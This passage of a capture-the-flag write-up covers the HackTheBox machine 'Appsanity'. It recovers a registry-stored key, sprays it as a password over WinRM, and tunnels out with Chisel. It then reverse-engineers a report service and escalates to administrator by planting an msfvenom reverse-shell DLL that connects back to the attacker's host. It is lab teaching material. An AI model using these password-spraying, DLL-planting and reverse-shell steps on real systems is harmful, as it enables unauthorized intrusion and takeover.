            this.Response.Redirect("Error.aspx?message=error+occurred");
            return (string) null;
          }
          object obj = registryKey.GetValue("EncKey");
          if (obj != null)
            return obj.ToString();
          ErrorLogger.LogError("Encryption Key Not Found in Registry");
          this.Response.Redirect("Error.aspx?message=error+occurred");
          return (string) null;
        }
      }
      catch (Exception ex)
      {
        ErrorLogger.LogError("Error Retrieving Encryption Key", ex);
        this.Response.Redirect("Error.aspx?message=error+occurred");
        return (string) null;
      }
    }

```

It reads from the `Local Machine` hive the key `Software\MedDigi`, getting the value `EncKey`.

### WinRM

#### Recover Key

In PowerShell, I can enter registry hives like drives with directories:

```

PS C:\inetpub> cd hklm:\Software\MedDigi
PS HKLM:\Software\MedDigi>

```

`Get-ItemProperty` will show the values of this key:

```

PS HKLM:\Software\MedDigi> Get-ItemProperty .

EncKey       : 1g0tTh3R3m3dy!!
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\MedDigi
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software
PSChildName  : MedDigi
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry

```

The `EncKey` is “1g0tTh3R3m3dy!!”.

#### Shell

To check if any known user on this box uses this key, I’ll save all the users from `net user` in a file on my host and spray with [NetExec](https://www.netexec.wiki/). SMB isn’t accessible, but I can try WinRM:

```

oxdf@hacky$ netexec winrm meddigi.htb -u users -p '1g0tTh3R3m3dy!!' --continue-on-success
WINRM       10.10.11.238    5985   APPSANITY        [*] Windows 10 / Server 2019 Build 19041 (name:APPSANITY) (domain:Appsanity)
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\Administrator:1g0tTh3R3m3dy!!
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\DefaultAccount:1g0tTh3R3m3dy!!
WINRM       10.10.11.238    5985   APPSANITY        [+] Appsanity\devdoc:1g0tTh3R3m3dy!! (Pwn3d!)
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\Guest:1g0tTh3R3m3dy!!
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\svc_exampanel:1g0tTh3R3m3dy!!
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\svc_meddigi:1g0tTh3R3m3dy!!
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\svc_meddigiportal:1g0tTh3R3m3dy!!
WINRM       10.10.11.238    5985   APPSANITY        [-] Appsanity\WDAGUtilityAccount:1g0tTh3R3m3dy!!

```

I like `--continue-on-success` to see if multiple users share the password. It works for devdoc, and gets a shell with Evil-WinRM:

```

oxdf@hacky$ evil-winrm -i meddigi.htb -u devdoc -p '1g0tTh3R3m3dy!!'

Evil-WinRM shell v3.4
*Evil-WinRM* PS C:\Users\devdoc\Documents> 

```

## Shell as administrator

### Enumeration

#### Identify ReportManagement Process

In looking around the host, I’ll notice there are a bunch more ports listening than the three I can connect to from my host:

```
*Evil-WinRM* PS C:\Users\devdoc\Documents> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:100            0.0.0.0:0              LISTENING       4880
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       924
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       1280
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       692
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       532
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1116
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1528
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
  TCP    10.10.11.238:139       0.0.0.0:0              LISTENING       4
  TCP    10.10.11.238:5985      10.10.14.6:44310       ESTABLISHED     4
  TCP    10.10.11.238:62885     10.10.14.6:443         ESTABLISHED     4480
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       924
  TCP    [::]:443               [::]:0                 LISTENING       4
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       692
  TCP    [::]:49665             [::]:0                 LISTENING       532
  TCP    [::]:49666             [::]:0                 LISTENING       1116
  TCP    [::]:49667             [::]:0                 LISTENING       1528
  TCP    [::]:49668             [::]:0                 LISTENING       668
  UDP    0.0.0.0:123            *:*                                    5992
  UDP    0.0.0.0:5050           *:*                                    1280
  UDP    0.0.0.0:5353           *:*                                    1948
  UDP    0.0.0.0:5355           *:*                                    1948
  UDP    10.10.11.238:137       *:*                                    4
  UDP    10.10.11.238:138       *:*                                    4
  UDP    10.10.11.238:1900      *:*                                    3332
  UDP    10.10.11.238:65138     *:*                                    3332
  UDP    127.0.0.1:1900         *:*                                    3332
  UDP    127.0.0.1:49664        *:*                                    2024
  UDP    127.0.0.1:65139        *:*                                    3332
  UDP    [::]:123               *:*                                    5992
  UDP    [::1]:1900             *:*                                    3332
  UDP    [::1]:65137            *:*                                    3332

```

Before I start pinging SMB and LDAP, port 100 jumps out as unusual. The output above shows this as PID 4880, which I can get from the process list if I’m fast:

```
*Evil-WinRM* PS C:\Users\devdoc\Documents> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
     76       5     2976       4140              2312   0 cmd
    134       9     4196       1656               688   0 conhost
    113       8     6336      10932               780   0 conhost
    134       9     4528       1504              1020   0 conhost
    134       9     4200       2968              4948   0 conhost
    552      22     1772       5420               424   0 csrss
    177      10     1604       4968               540   1 csrss
    122       7     1128       5620              2828   0 dasHost
    262      14     3916      14348              3668   0 dllhost
    698      29    26664      56896                60   1 dwm
     36       5     1456       3760               820   0 fontdrvhost
     36       5     1480       3752               828   1 fontdrvhost
      0       0       60          8                 0   0 Idle
    748      39    20076      66328              3488   1 LogonUI
   1141      23     5804      17496               692   0 lsass
      0       0      276       4496              1596   0 Memory Compression
    210      13     2044       4060              1996   0 MicrosoftEdgeUpdate
    230      13     2972      10860              4136   0 msdtc
    437      16     4424      17656              2808   0 MsMpEng
   1467      27   115832     126996               900   0 powershell
    418      36   112660       6764              2332   0 powershell
    554      40   132664      23448              2344   0 powershell
    433      38   118200       6680              2352   0 powershell
      0      13     2972      20392                92   0 Registry
    143       9     1424       6908              4880   0 ReportManagement
    190      11     2620      12368               896   0 SearchFilterHost
    794      66    33888      42148              3196   0 SearchIndexer
    360      14     2800      11152              1984   0 SearchProtocolHost
    589      11     5084      10212               668   0 services
    106       8     4180       7436              2956   0 SgrmBroker
     53       3     1056       1152               320   0 smss
    269      13     3376      11616               348   0 svchost
    112       7     1240       5500               404   0 svchost
    187      11     1812       8592               748   0 svchost
    126       7     1288       6044               756   0 svchost
   1507      16    10456      20680               800   0 svchost
    822      17    18664      25340               924   0 svchost
    234       9     2052       7592               972   0 svchost
    124       7     2248       7540              1008   0 svchost
    197      13     1904       8912              1016   0 svchost
    254       7     1444       6364              1072   0 svchost
    347      13    12392      16560              1116   0 svchost
    124      15     3096       7480              1200   0 svchost
    121       8     1392       7440              1260   0 svchost
    316      19     4280      17212              1280   0 svchost
    207       9     2072       7444              1328   0 svchost
    224      12     2912      12116              1400   0 svchost
    426       9     2900       9184              1412   0 svchost
    191      10     2348       9720              1440   0 svchost
    118       7     1208       5908              1468   0 svchost
    393      17     6196      16056              1528   0 svchost
    389      13     4068      11940              1576   0 svchost
    130       8     1308       6000              1648   0 svchost
    147       9     1552       7824              1716   0 svchost
    158      10     1892       8516              1732   0 svchost
    420      12     2884      10056              1808   0 svchost
    189      15     5996       9876              1820   0 svchost
    191      10     1876       8588              1888   0 svchost
    251      12     2780       8380              1948   0 svchost
    130       9     1556       6684              1956   0 svchost
    362      12     2200       9908              1972   0 svchost
    365      15     2724      11012              2024   0 svchost
    407      32    10680      20024              2056   0 svchost
    186      11     2068       8672              2132   0 svchost
    176      10     1920       8968              2180   0 svchost
    164       9     1948       7784              2208   0 svchost
    169      12     3984      11444              2456   0 svchost
    241      25     3304      12924              2464   0 svchost
    130       7     1272       6432              2480   0 svchost
    457      24    21240      37188              2500   0 svchost
    321      18    22452      29548              2516   0 svchost
    419      17    11764      22144              2536   0 svchost
    133       9     1576       7000              2616   0 svchost
    128       7     1248       5796              2632   0 svchost
    209      12     2460       9640              2648   0 svchost
    199      11     2840      16000              2724   0 svchost
    251      15     4768      12860              2740   0 svchost
    208      12     1944       7640              2868   0 svchost
    105       7     1232       5640              2912   0 svchost
    336      20     5940      24004              2932   0 svchost
    400      26     3620      14176              3164   0 svchost
    231      14     2092       7836              3332   0 svchost
    210      12     2860      10832              3560   0 svchost
    162      10     1832       7660              3596   0 svchost
    261       8     1616       7720              4072   0 svchost
    206      11     1884       8664              4292   0 svchost
    216      13     2932      12128              4380   0 svchost
    442      27     9128      18364              4384   0 svchost
    131       8     6688      14344              4392   0 svchost
    230      14     5048      17672              4544   0 svchost
    181      10     3372       7696              4860   0 svchost
    169      11     2572      13748              5448   0 svchost
    244      14     3252      13332              5460   0 svchost
    255      19     3204      12376              5576   0 svchost
    204      12     1728       7724              5992   0 svchost
    211      11     2480      11344              6000   0 svchost
   1849       0      196        112                 4   0 System
    170      11     2868      11220              2640   0 VGAuthService
    118       7     1440       6260              2688   0 vm3dservice
    116       8     1516       6672              3044   1 vm3dservice
    113       8     1436       6588              3940   1 vm3dservice
    395      22    10904      22676              2664   0 vmtoolsd
    895      59   233804     227904              4480   0 w3wp
    164      11     1372       7176               532   0 wininit
    246      13     2772      19988               600   1 winlogon
    360      17   132784     141760              3964   0 WmiPrvSE
    863      28    59708      74808       0.81   2272   0 wsmprovhost

```

The process seems to be restarting quickly, so I’ll write a single line of PowerShell to get the process id and then pull the process information:

```
*Evil-WinRM* PS C:\Users\devdoc\Documents> Get-Process -Id (netstat -ano | findstr 100 | select-string -pattern '\s+(\d+)$').Matches.Groups[1].Value

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    143      10     1500       6952               296   0 ReportManagement

```

The process listening on port 100 is `ReportManagement`.

#### Identify Binary

There’s a directory in `C:\Program Files\` named `ReportManagement`:

```
*Evil-WinRM* PS C:\Program Files> ls

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/15/2023   7:36 AM                Common Files
d-----         9/15/2023   8:16 AM                dotnet
d-----         9/15/2023   8:16 AM                IIS
d-----        10/23/2023  12:17 PM                Internet Explorer
d-----         9/17/2023   3:23 AM                Microsoft Update Health Tools
d-----         12/7/2019   1:14 AM                ModifiableWindowsApps
d-----        10/20/2023  12:42 PM                ReportManagement
d-----        10/23/2023   4:59 PM                RUXIM
d-----         9/15/2023   7:36 AM                VMware
d-----        10/23/2023  12:17 PM                Windows Defender
d-----        10/23/2023  12:17 PM                Windows Defender Advanced Threat Protection
d-----        10/23/2023  12:17 PM                Windows Mail
d-----         12/7/2019   1:54 AM                Windows Multimedia Platform
d-----         12/7/2019   1:50 AM                Windows NT
d-----        10/23/2023  12:17 PM                Windows Photo Viewer
d-----         12/7/2019   1:54 AM                Windows Portable Devices
d-----         12/7/2019   1:31 AM                Windows Security
d-----         12/7/2019   1:31 AM                WindowsPowerShell
*Evil-WinRM* PS C:\Program Files> cd ReportManagement
*Evil-WinRM* PS C:\Program Files\ReportManagement> ls

    Directory: C:\Program Files\ReportManagement

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/23/2023  11:33 AM                Libraries
-a----          5/5/2023   5:21 AM          34152 cryptbase.dll
-a----          5/5/2023   5:21 AM          83744 cryptsp.dll
-a----         3/11/2021   9:22 AM         564112 msvcp140.dll
-a----         9/17/2023   3:54 AM         140512 profapi.dll
-a----        10/20/2023   2:56 PM         102912 ReportManagement.exe
-a----        10/20/2023   1:47 PM       11492864 ReportManagementHelper.exe
-a----         3/11/2021   9:22 AM          96144 vcruntime140.dll
-a----         3/11/2021   9:22 AM          36752 vcruntime140_1.dll
-a----          5/5/2023   5:21 AM         179248 wldp.dll

```

All of this enumeration could have been done as svc\_exampanel, but it’s worth noting that that user couldn’t read this binary:

```
*Evil-WinRM* PS C:\Program Files\ReportManagement> icacls ReportManagement.exe
ReportManagement.exe APPSANITY\devdoc:(DENY)(W,X)
                     NT AUTHORITY\SYSTEM:(F)
                     BUILTIN\Administrators:(F)
                     APPSANITY\devdoc:(R)

Successfully processed 1 files; Failed processing 0 files

```

While looking at permissions in this directory, I’ll notice that the `Libraries` directory is owned by devdoc:

```
*Evil-WinRM* PS C:\Program Files\ReportManagement>icacls Libraries
Libraries APPSANITY\devdoc:(OI)(CI)(RX,W)
          BUILTIN\Administrators:(I)(F)
          CREATOR OWNER:(I)(OI)(CI)(IO)(F)
          NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
          BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
          BUILTIN\Users:(I)(OI)(CI)(R)
          NT SERVICE\TrustedInstaller:(I)(CI)(F)
          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(RX)
          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files

```

It is currently empty, which is suspicious.

devdoc cannot access the `ReportManagementHelper.exe` binary:

```
*Evil-WinRM* PS C:\Program Files\ReportManagement> icacls ReportManagementHelper.exe
Successfully processed 0 files; Failed processing 1 files
icacls.exe : ReportManagementHelper.exe: Access is denied.
    + CategoryInfo          : NotSpecified: (ReportManagemen...cess is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

```

#### Process Interaction

Trying to interact with the binary doesn’t work over HTTP or HTTPS:

```
*Evil-WinRM* PS C:\Program Files\ReportManagement> curl http://localhost:100
The server committed a protocol violation. Section=ResponseStatusLine
At line:1 char:1
+ curl http://localhost:100
+ ~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
*Evil-WinRM* PS C:\Program Files\ReportManagement> curl https://localhost:100
The underlying connection was closed: An unexpected error occurred on a send.
At line:1 char:1
+ curl https://localhost:100
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

```

I’ll start the [Chisel](https://github.com/jpillora/chisel) server on my VM and upload the Windows binary to Appsanity to get a tunnel to localhost:

```
*Evil-WinRM* PS C:\programdata> upload /opt/chisel/chisel_1.9.1_windows_amd64 \programdata\c.exe                              
Info: Uploading /opt/chisel/chisel_1.9.1_windows_amd64 to \programdata\c.exe

Data: 12008104 bytes of 12008104 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> .\c.exe client 10.10.14.6:8000 R:10000:127.0.0.1:100
c.exe : 2024/03/02 03:44:29 client: Connecting to ws://10.10.14.6:8000
    + CategoryInfo          : NotSpecified: (2024/03/02 03:4...10.10.14.6:8000:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2024/03/02 03:44:30 client: Connected (Latency 97.2358ms)

```

There’s an error, but my server shows the tunnel:

```

oxdf@hacky$ ./chisel_1.9.1_linux_amd64 server -p 8000 --reverse 
2024/03/02 06:37:42 server: Reverse tunnelling enabled
2024/03/02 06:37:42 server: Fingerprint ds0r8UB0J6WEjmcpLmdcmd7E4Y2D8azZsiBUTmwDJf0=
2024/03/02 06:37:42 server: Listening on http://0.0.0.0:8000
2024/03/02 06:44:27 server: session#18: tun: proxy#R:10000=>100: Listening

```

And I can interact with it over `nc`:

```

oxdf@hacky$ nc localhost 10000
Reports Management administrative console. Type "help" to view available commands.

```

`help` shows the commands:

```

‌help
Available Commands:
backup: Perform a backup operation.
validate: Validates if any report has been altered since the last backup.
recover <filename>: Restores a specified file from the backup to the Reports folder.
upload <external source>: Uploads the reports to the specified external source.

```

I can try some of the commands, but nothing too interesting:

```

‌backup
Backup operation completed successfully.
‌validate
Validation completed. All reports are intact.
‌recover \users\administator\desktop\root.txt
Specified file not found in the backup directory.
‌upload 10.10.14.6    
Failed to upload to external source.

```

There’s no connect back to my host that I see on the `upload` command.

### Report Management RE

#### Strings Analysis

I’ll copy all the files that I can back to my host using SMB again. As noted above, devdoc doesn’t have read access to `ReportManagementHelper.exe`.

```

oxdf@hacky$ file *
cryptbase.dll:        PE32+ executable (DLL) (console) x86-64, for MS Windows
cryptsp.dll:          PE32+ executable (DLL) (console) x86-64, for MS Windows
Libraries:            directory
msvcp140.dll:         PE32+ executable (DLL) (console) x86-64, for MS Windows
profapi.dll:          PE32+ executable (DLL) (GUI) x86-64, for MS Windows
ReportManagement.exe: PE32+ executable (GUI) x86-64, for MS Windows
vcruntime140_1.dll:   PE32+ executable (DLL) (console) x86-64, for MS Windows
vcruntime140.dll:     PE32+ executable (DLL) (console) x86-64, for MS Windows
wldp.dll:             PE32+ executable (DLL) (console) x86-64, for MS Windows

```

These are not .NET binaries, so I’ll use Ghidra, starting with `ReportManagement.exe`. Looking at the strings to get oriented, there are a bunch of interesting ones all grouped together in memory and where they are referenced:

[![image-20240308093321459](/img/image-20240308093321459.png)*Click for full size image*](/img/image-20240308093321459.png)

There’s a couple references to upload. There’s a reference to the binary I can’t access, `ReportManagementHelper`, and `cmd.exe`. There’s the writable `Libraries` directory. And “externalupload” and “dll”. Each of these strings is used in `FUN_1400042b0`.

#### FUN\_1400042b0

This function is *huge*, and the decompile from Ghidra is a mess. The decompilation output is 2212 lines.

After 317 lines of declaring variables, there’s a reference to `reportmanagement_log.txt`, and then it enters a do while true loop starting at line 340 in my Ghidra output:

![image-20240308093911014](/img/image-20240308093911014.png)

There is a call to `CreateProcessW` shortly after the reference to `ReportManagementHelper.exe`, which would make sense to have that called:

![appsanity-reportmanagement-re-process](/img/appsanity-reportmanagement-re-process.png)

#### Dynamic Analysis

I’ll copy all the files I have to my Windows VM in a folder on my Desktop. I’ll also start [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) (or ProcMon) running to collect events.

When I run `ReportManagement.exe`, it creates a `reportmanagement_log.txt` file in `~/logs`. This file shows an error that it failed to find a directory:

![image-20240308103834508](/img/image-20240308103834508.png)

It’s not important to find this log, as I would find this also using ProcMon. I’ll also note that the process runs in the background and listens on TCP 100 (notice the PID matches) just like on Appsanity:

```

PS C:\Users\0xdf > Get-Process -name ReportManagement

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    121       9     1428       7348       0.05   4008   1 ReportManagement
    
PS C:\Users\0xdf > netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:100            0.0.0.0:0              LISTENING       4008
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       988
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       1744
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       736
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       584
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1204
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1244
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2584
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2824
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       724
  TCP    10.0.2.15:139          0.0.0.0:0              LISTENING       4
  TCP    10.0.2.15:53446        204.79.197.239:443     FIN_WAIT_2      5548
  TCP    [::]:135               [::]:0                 LISTENING       988
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       1744
  TCP    [::]:49664             [::]:0                 LISTENING       736
  TCP    [::]:49665             [::]:0                 LISTENING       584
  TCP    [::]:49666             [::]:0                 LISTENING       1204
  TCP    [::]:49667             [::]:0                 LISTENING       1244
  TCP    [::]:49668             [::]:0                 LISTENING       2584
  TCP    [::]:49669             [::]:0                 LISTENING       2824
  TCP    [::]:49670             [::]:0                 LISTENING       724
  UDP    0.0.0.0:500            *:*                                    2816
  UDP    0.0.0.0:4500           *:*                                    2816
  UDP    0.0.0.0:5050           *:*                                    620
  UDP    0.0.0.0:5353           *:*                                    2232
  UDP    0.0.0.0:5355           *:*                                    2232
  UDP    10.0.2.15:137          *:*                                    4
  UDP    10.0.2.15:138          *:*                                    4
  UDP    10.0.2.15:1900         *:*                                    2172
  UDP    10.0.2.15:54746        *:*                                    2172
  UDP    127.0.0.1:1900         *:*                                    2172
  UDP    127.0.0.1:52691        *:*                                    3124
  UDP    127.0.0.1:54747        *:*                                    2172
  UDP    [::]:500               *:*                                    2816
  UDP    [::]:4500              *:*                                    2816
  UDP    [::1]:1900             *:*                                    2172
  UDP    [::1]:54745            *:*                                    2172

```

In ProcMon, I’ll set up a filter so that I only get events from `ReportManagement.exe`, and to start, I’ll look at attempts to interact with files that fail by filtering on `CreateFile` operations that result in anything but `SUCCESS`:

![image-20240308104427246](/img/image-20240308104427246.png)

There’s a bunch of failures trying to open `C:\inetpub\ExaminationPanel\ExaminationPanel\Reports`:

![image-20240308104539790](/img/image-20240308104539790.png)

The `.exe.mun` file is something [related to resources](https://fileinfo.com/extension/mun), which I’ll ignore for now. I’ll run `stop-process -name ReportManagement` in PowerShell, create this directory, and run it again. This time it fails to find `C:\Users\Administrator\Backup`. I’ll create this as well. Now when I run, no failures.

Given all the interesting strings in the binary were used between messages about uploading, I’ll start by focusing on the `upload` command. I’ll connect to my local instance and enter `upload 0xdf` (as the command takes an “external source”). It’s not important what I put for the source, but I want something that might fail to see where it fails.

When I do, there’s another failure in ProcMon, showing a failure:

![image-20240308105416242](/img/image-20240308105416242.png)

I’ll move my `ReportManagement` directory into `C:\Program Files` and continue. Now there are no errors.

I’ll run the program in [x64dbg](https://x64dbg.com/), but it doesn’t reach the `CreateProcessW` call.

#### Libraries

The writable `Libraries` directory seems important, so I’ll go back to where that’s used. The code is still very hard to understand, but there are references to `directory_iterator` and `directory_entry`:

![image-20240308112559877](/img/image-20240308112559877.png)

Given that, I’ll create a few files in my local `Libraries`:

```

PS C:\Program Files\ReportManagement\Libraries > ls

    Directory: C:\Program Files\ReportManagement\Libraries

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2024  11:26 AM              0 test.dll
-a----          3/8/2024  11:26 AM              0 test.exe
-a----          3/8/2024  11:26 AM              0 test.txt

```

Now I’ll start the program in x64dbg. There’s a while loop that starts at 140004900 that only enters if there are files in `Libraries`. Stepping into the loop, it loads the string `.dll`, and then `test.dll`:

[![image-20240308113232601](/img/image-20240308113232601.png)*Click for full size image*](/img/image-20240308113232601.png)

Still, it doesn’t reach `CreateProcessW`. A bit further down, the “externaupload” string is referenced with a `memcmp`:

![image-20240308113809619](/img/image-20240308113809619.png)

To get here, there are a series of checks. So the loop goes over each file in `Libraries`. If it has the `.dll` extension, then it finds the first “e” (`memchr` call at 1400004cb5) and compares the string from that point to “externalupload” (`memcmp` at 140004ce0). If that matches, then it reaches the `CreateProcessW` call (at 140005387):

![image-20240308115459179](/img/image-20240308115459179.png)

The command would be `cmd.exe /c ReportManagementHelper Libraries\externalupload.dll`.

### Execution

#### Strategy

I don’t have access to `ReportManagementHelper.exe`, but it seems if there’s a `externalupload.dll` in `Libraries` that it will be passed to that executable when it is called, which suggests it will be loaded. Since I can write to `Libraries`, I’ll generate a malicious DLL that creates a reverse shell, upload it, and then connect and trigger it.

#### Generate Payload

I haven’t seen any AV running here, so the simplest idea is to generate a DLL payload using `msfvenom` from Metasploit.

```

oxdf@hacky$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f dll -o externalupload.dll -a x64 --platform windows
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: externalupload.dll

```

I’m using an unstaged payload so I can catch it in `nc`. If I had used `windows/x64/shell/reverse/tcp`, that would create one I had to catch in Metasploit.

I’ll upload this to the `Libraries` directory:

```
*Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> upload externalupload.dll
Info: Uploading externalupload.dll to C:\Program Files\ReportManagement\Libraries\externalupload.dll
                                                             
Data: 12288 bytes of 12288 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> ls

    Directory: C:\Program Files\ReportManagement\Libraries

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2024   9:19 AM           9216 externalupload.dll

```

#### Trigger

Now I’ll connect to the service over my Chisel tunnel and trigger it:

```

oxdf@hacky$ rlwrap nc localhost 10000
Reports Management administrative console. Type "help" to view available commands.
‌upload 0xdf
Attempting to upload to external source.

```

It hangs, and there’s a shell as administrator:

```

oxdf@hacky$ rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.238 49268
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\ReportManagement> whoami
appsanity\administrator

```

And `root.txt`:

```

C:\Users\Administrator\Desktop> type root.txt
78eae46d************************

```